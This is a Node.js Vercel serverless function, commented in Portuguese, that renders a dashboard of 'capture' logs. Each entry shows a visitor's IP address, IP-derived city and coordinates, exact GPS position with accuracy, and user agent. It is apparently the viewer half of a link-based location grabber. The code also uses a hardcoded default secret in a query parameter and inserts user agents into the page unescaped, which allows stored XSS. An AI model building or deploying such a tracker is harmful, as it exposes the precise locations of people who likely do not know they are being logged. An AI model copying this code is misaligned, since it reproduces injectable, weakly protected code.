const { kv } = require('@vercel/kv');

const SECRET = process.env.LOGS_SECRET || 'trocar-essa-senha-123';

module.exports = async function handler(req, res) {
  // Proteção simples por query param
  if (req.query.secret !== SECRET) {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  try {
    const keysList = await kv.get('capture_keys');
    const keys = keysList ? JSON.parse(keysList) : [];

    const entries = [];
    for (const key of keys.slice(-50)) { // últimos 50
      const raw = await kv.get(key);
      if (raw) entries.push(JSON.parse(raw));
    }

    res.setHeader('Content-Type', 'text/html');
    res.status(200).send(`
<!DOCTYPE html>
<html><head>
<meta charset="UTF-8">
<title>Logs de Captura</title>
<style>
  body { font-family: monospace; background: #1a1a2e; color: #eee; padding: 20px; }
  h1 { color: #4CAF50; }
  .entry { background: #16213e; padding: 16px; border-radius: 8px; margin: 12px 0; border-left: 4px solid #4CAF50; }
  .entry .ts { color: #888; font-size: 12px; }
  .entry .ip { color: #e94560; font-weight: bold; font-size: 18px; }
  .entry .geo { color: #0f3460; background: #e8f5e9; padding: 4px 8px; border-radius: 4px; display: inline-block; margin: 4px 0; }
  .entry .gps { color: #ff9800; }
  .entry pre { color: #aaa; font-size: 11px; margin-top: 8px; white-space: pre-wrap; }
  .count { color: #888; }
  a { color: #4CAF50; }
</style>
</head><body>
<h1>Capturas</h1>
<p class="count">${entries.length} registro(s)</p>
${entries.reverse().map(e => `
<div class="entry">
  <div class="ts">${e.timestamp}</div>
  <div class="ip">IP: ${e.ip}</div>
  ${e.ip_geo ? `<div class="geo">${e.ip_geo.city || '?'}, ${e.ip_geo.region || '?'} - ${e.ip_geo.country || '?'} | Lat: ${e.ip_geo.latitude}, Lng: ${e.ip_geo.longitude}</div>` : ''}
  ${e.gps ? `<div class="gps">GPS EXATO: Lat ${e.gps.latitude}, Lng ${e.gps.longitude} (±${e.gps.accuracy_meters}m)</div>` : '<div style="color:#888">GPS: não autorizado</div>'}
  <div style="color:#666; font-size:12px">UA: ${e.userAgent || '?'}</div>
</div>
`).join('')}
<p><br><a href="?secret=${SECRET}">Atualizar</a></p>
</body></html>
    `);
  } catch (e) {
    res.status(500).json({ error: e.message, hint: 'Vercel KV não configurado? Veja os Function Logs no dashboard.' });
  }
};
